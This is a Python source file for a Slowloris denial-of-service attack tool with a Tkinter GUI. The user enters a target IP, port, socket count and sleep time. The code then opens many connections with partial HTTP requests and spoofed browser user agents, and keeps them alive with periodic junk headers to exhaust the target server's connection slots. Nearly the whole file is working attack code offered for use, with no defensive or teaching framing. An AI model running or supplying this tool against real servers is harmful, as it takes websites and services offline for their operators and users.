"Slow loris Attack Tool & GUI"
from tkinter import *
import tkinter as tk
import logging
import random
import socket
import sys
import time
import threading

#Define global variable to control attack loop
STOP = 1
#Set up logging level at INFO
logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.INFO,
    )
#function to send line
def send_line(self, line):
    '''Sends and encodes line'''
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

#function to send header
def send_header(self, name, value):
    '''Sends headers'''
    self.send_line(f"{name}: {value}")

#Create a list of sockets
list_of_sockets = []
#These are the browser user agents
user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 \
         (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 \
        (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 \
         Firefox/49.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 \
        (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 \
        (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 \
         (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 \
        (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

#set attributes for send_line and send_header
setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

#Create TKinter GUI
root = tk.Tk()
root.title("SlowLoris Attack Tool")
root.configure(background="grey")
root.resizable(0,0)

#Default variable values for target IP, sockets, target port & sleep time
target = StringVar()
sockets = IntVar(root,150)
target_port = IntVar(root,80)
sleep = IntVar(root,15)

#Add labels for each variable
tk.Label(root,text="Target URL/IP").grid(column=0, row=0, sticky=tk.W, padx=5, pady=5)
tk.Label(root,text="Sockets").grid(column=0, row=1, sticky=tk.W, padx=5, pady=5)
tk.Label(root,text="Port").grid(column=0, row=2, sticky=tk.W, padx=5, pady=5)
tk.Label(root,text="Sleeptime").grid(column=0, row=3, sticky=tk.W, padx=5, pady=5)

#Create frames and format for grid
f1 = tk.Frame(root)
f2 = tk.Frame(root,bg="grey")
f1.grid(row=4, column=1, padx=5, pady=5, sticky=tk.W)
f2.grid(row=8, column=1, padx=5, pady=5, sticky=tk.W,ipadx=10)

#Handle user entry to allow attack variables to be adjusted
e1 = tk.Entry(root, textvariable=target)
e2 = tk.Entry(root,textvariable=sockets)
e3 = tk.Entry(root,textvariable=target_port)
e4 = tk.Entry(root,textvariable=sleep)

#Format the user entries
e1.grid(column=1, row=0, sticky=tk.W, padx=5, pady=5)
e2.grid(column=1, row=1, sticky=tk.W, padx=5, pady=5)
e3.grid(column=1, row=2, sticky=tk.W, padx=5, pady=5)
e4.grid(column=1, row=3, sticky=tk.W, padx=5, pady=5)

#Define a class to allow the attack loop to run in a thread
class StoppableThread(threading.Thread):
    """Thread class with a stop() method. The thread itself has to check
    regularly for the stopped() condition."""

    def __init__(self,  *args, **kwargs):
        """Thread class with a stop() method. The thread itself has to check\
        regularly for the stopped() condition."""
        super().__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        """stop method for thread class"""
        self._stop_event.set()

    def stopped(self):
        """stopped condition thread object checks for"""
        return self._stop_event.is_set()

#Handle button click to start attack loop
def start_launch():
    """Starts the attack loop when attack button clicked"""

    b3['state']= DISABLED
    b1['state']= NORMAL

    # Assign global variable and initialize value
    global STOP
    STOP = 0

    # Create and launch a thread
    attack_thread = StoppableThread(target=launch)
    attack_thread.start()


#Define  a function to stop the attack
def stop():
    """Assign global variable and set value to stop attack loop"""
    global STOP
    STOP = 1
    print("clicked stop")
    b3['state']= NORMAL
    b1['state']= DISABLED
    textbox.insert(END,"Attack stopped\n")
    textbox.see(END)

#Define a function to handle user closing window
def on_closing():
    """function to stop attack when window closed"""
    global STOP
    STOP = 1
    logging.info("exited")
    root.destroy()
    print("closing window")

#Allow window to be closed
root.protocol("WM_DELETE_WINDOW", on_closing)

#Handle exit button click event
def exit_tool():
    """checks global variable and sets to 1 to stop loop"""
    global STOP
    STOP = 1
    b2['state']= DISABLED
    textbox.insert(END,"Exiting SlowLoris Attack Tool....\n")
    textbox.see(END)
    print("exiting tool")
    root.after(2000, root.destroy)

#Allow user to click reset and clear text box, reset attack variables to default
def clear_text():
    """Clears textbox and resets default variables"""
    global STOP
    STOP = 1
    textbox.delete("1.0","end")
    textbox.insert(END,"***Welcome to SlowLoris Attack Tool***\n")
    textbox.see(END)
    sockets.set(150)
    target_port.set(80)
    sleep.set(15)
    b3['state']= NORMAL
    b1['state']= DISABLED

# Textbox window where attack details to be printed:
textbox = Text(root, width=55, height=15, highlightbackground="#3B5262", bg="black", fg="#00FD61")
textbox.grid(pady=5, padx=5, sticky=W, column=1, row =7)
textbox.insert(END,"***Welcome to SlowLoris Attack Tool***\n")
textbox.see(END)

#Add buttons to allow user to stop, quit, reset and launch attack
b1 = tk.Button(f2, text='Stop',command = stop, state = DISABLED)
b2 = tk.Button(f2, text='Quit', command= exit_tool )
b3 = tk.Button(root,text='Launch', command=start_launch, state = NORMAL )
b4 = tk.Button(root, text='Reset', command= clear_text )
#Format buttons
b1.pack(side = "left")
b2.pack(side = "right")
b3.grid(column=1, row=6, sticky=tk.W, padx=5, pady=5)
b4.grid(column=1, row=5, sticky=tk.W, padx=5, pady=5)

#Funciton to create sockets for target IP address and port
def init_socket(ip_address,port):
    """Intialises the socket connections"""
    s_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_socket.settimeout(4)
    s_socket.connect((ip_address,port))
    s_socket.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
    user_ag = user_agents[0]
    user_ag = random.choice(user_agents)
    s_socket.send_header("User-Agent", user_ag)
    s_socket.send_header("Accept-language", "en-US,en,q=0.5")
    return s_socket

#Function to launch attack loop
def launch():
    """Launches the attack loop."""
    list_of_sockets.clear()
    ip_address = target.get()
    socket_count = sockets.get()
    port = target_port.get()
    sleeptime = sleep.get()
    logging.info("Attacking %s with %s sockets.", ip_address, socket_count)
    textbox.insert(END,f">Attacking {ip_address} with {socket_count} sockets.\n")
    textbox.see(END)
    textbox.insert(END,f">Attacking on port {port}.\n")
    textbox.see(END)
    textbox.insert(END,f">{sleeptime} seconds sleeptime.\n")
    textbox.see(END)
    logging.info("Creating sockets...")
    textbox.insert(END,"Creating sockets...\n")
    textbox.see(END)
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s_socket = init_socket(ip_address,port)
        except socket.error as error:
            logging.debug(error)
            break
        list_of_sockets.append(s_socket)
    #check global variable for while loop
    while STOP == 0:

        try:
            logging.info(
            "Sending keep-alive headers... Socket count: %s",
            len(list_of_sockets),
            )

            textbox.insert(END,f"Sending keep-alive headers...socket count:{len(list_of_sockets)}\n")
            textbox.see(END)
            for s_socket in list(list_of_sockets):
                try:
                    s_socket.send_header("X-a", random.randint(1, 5000))
                except socket.error:
                    list_of_sockets.remove(s_socket)
            for _ in range(socket_count - len(list_of_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s_socket = init_socket(ip_address,port)
                    if s_socket:
                        list_of_sockets.append(s_socket)
                except socket.error as error:
                    logging.debug(error)
                    break
            logging.debug("Sleeping for %d seconds", sleeptime)
            time.sleep(sleeptime)
        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slowloris")
            textbox.insert(END,"Stopping Slowloris Attack\n")
            textbox.see(END)
            break

tk.mainloop()
